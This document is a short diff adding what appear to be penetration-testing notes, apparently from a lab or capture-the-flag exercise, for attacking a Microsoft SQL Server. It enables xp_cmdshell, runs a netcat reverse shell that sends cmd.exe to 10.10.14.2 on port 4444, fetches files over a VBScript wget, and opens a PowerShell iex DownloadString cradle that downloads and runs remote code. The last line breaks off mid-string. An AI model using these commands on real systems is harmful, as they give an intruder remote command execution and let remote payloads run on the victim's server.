@@ -1,0 +1,9 @@
+enable_xp_cmdshell
+reconfigure
+
+downloadscript to upload files
+
+xp_cmdshell c:\windows\system32\cmd.exe cmd /k %TMP%\nc.exe -e c:\windows\system32\cmd.exe -nv 10.10.14.2 4444
+xp_cmdshell %TMP%\wget.vbs http://10.10.14.2/
+
+iex (New-Object Net.WebClient).DownloadString('http://10.10.14.2/
